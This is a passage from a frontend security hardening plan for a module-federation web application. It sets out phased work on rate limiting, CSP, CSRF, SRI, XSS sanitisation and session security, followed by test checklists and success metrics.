- [ ] Rate limiting stress test
- [ ] Module federation spoofing test
- [ ] Session hijacking attempt

**Documentation:**

- [ ] Create security runbooks
- [ ] Document incident response procedures
- [ ] Create threat model document
- [ ] Update security policy

---

## 12. Implementation Phases

### Phase 1: Critical Fixes (Week 1 - 8 hours)

**Day 1-2: Rate Limiting (2 hours)**

```bash
# 1. Update nginx.conf
# 2. Test with curl loop
# 3. Verify 429 responses
# 4. Monitor logs
```

**Day 3-4: CSP Hardening (3 hours)**

```bash
# 1. Generate nonce in build
# 2. Update rspack config
# 3. Deploy report-only
# 4. Monitor violations for 24h
```

**Day 5: CSRF & Deps (3 hours)**

```bash
# 1. Run npm audit
# 2. Fix vulnerabilities
# 3. Implement CSRF tokens
# 4. Test form submissions
```

**Deliverable:** Rate limiting + CSP report active

---

### Phase 2: Critical Security (Week 2 - 12 hours)

**Day 6-7: SRI Implementation (4 hours)**

```bash
# 1. Generate SRI hashes
# 2. Inject into shell config
# 3. Test remote loading
# 4. Verify hash mismatch rejection
```

**Day 8-9: XSS Hardening (4 hours)**

```bash
# 1. Audit dangerouslySetInnerHTML
# 2. Install DOMPurify
# 3. Sanitize user inputs
# 4. Test XSS payloads
```

**Day 10: Session Security (4 hours)**

```bash
# 1. Enable HttpOnly cookies
# 2. Implement refresh rotation
# 3. Add logout revocation
# 4. Test session lifecycle
```

**Deliverable:** SRI + XSS + Session protection active

---

### Phase 3: Hardening & Testing (Week 3-4 - 12 hours)

**Week 3:** Advanced Security

- Event bus validation
- Supply chain checks
- Monitoring setup
- Documentation

**Week 4:** Testing & Validation

- Penetration testing
- Stress testing
- Security audit
- Incident response drills

**Deliverable:** Production-ready security posture

---

## Success Metrics

### By End of Week 1:

- ✅ Rate limiting: Normal users unaffected, attackers blocked
- ✅ CSP: Report-only deployed, violations < 5/min
- ✅ Dependencies: No high/critical vulns remaining

### By End of Week 2:

- ✅ SRI: Remote loading validated
- ✅ XSS: All dangerouslySetInnerHTML audited
- ✅ Sessions: HttpOnly + rotation + revocation working
- ✅ CSRF: Token validation on all mutations

### By End of Week 4:

- ✅ No critical security findings
- ✅ All automated tests passing
- ✅ Penetration test completed
- ✅ Documentation complete

---

## Related Documents

- [BACKEND-HARDENING-PLAN.md](./BACKEND-HARDENING-PLAN.md) - Backend security
- [IMPLEMENTATION-ROADMAP-SUMMARY.md](./IMPLEMENTATION-ROADMAP-SUMMARY.md) - 8-week roadmap
- [COMPLETE-PRODUCTION-READINESS-ROADMAP.md](./COMPLETE-PRODUCTION-READINESS-ROADMAP.md) - All pillars

---

**Document Version:** 1.0  
**Date:** December 25, 2025  
**Status:** Complete - Ready for Implementation  
**Priority:** CRITICAL (Blocking factor for Week 1 of hardening)
